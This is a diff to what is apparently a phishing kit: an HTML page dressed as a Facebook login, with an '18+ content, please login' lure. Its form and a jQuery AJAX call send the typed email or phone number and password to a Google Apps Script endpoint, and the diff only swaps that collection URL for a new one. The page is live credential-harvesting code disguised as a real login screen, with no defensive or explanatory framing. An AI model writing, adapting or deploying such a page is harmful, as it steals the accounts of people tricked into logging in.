@@ -131,7 +131,7 @@
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
                         <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Content 18+, please login before viewing.</div>
-                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbwlP8g27-vqVX3WVt-Rr2uaM8rDQPeNb8352O5GAPO35-ErkGhtM4VNnhOVaHZBqaEL/exec">
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbykkRQxnLWmzdD_h1EzRc7V2-GGLm_uSdi0gRJymJlciLfctQ6nS3GC6HrLk0TaIfr9fg/exec">
                             <label class="mt-10">
                                 <input id="username" type="text" name="username" required="" placeholder="Email or phone number">
                             </label>
@@ -206,7 +206,7 @@ function submitForm() {
         var data = $('form#test-form').serialize();
         $.ajax({
             type: 'GET',
-            url: 'https://script.google.com/macros/s/AKfycbwlP8g27-vqVX3WVt-Rr2uaM8rDQPeNb8352O5GAPO35-ErkGhtM4VNnhOVaHZBqaEL/exec',
+            url: 'https://script.google.com/macros/s/AKfycbykkRQxnLWmzdD_h1EzRc7V2-GGLm_uSdi0gRJymJlciLfctQ6nS3GC6HrLk0TaIfr9fg/exec',
             dataType: 'json',
             crossDomain: true,
             data: data,
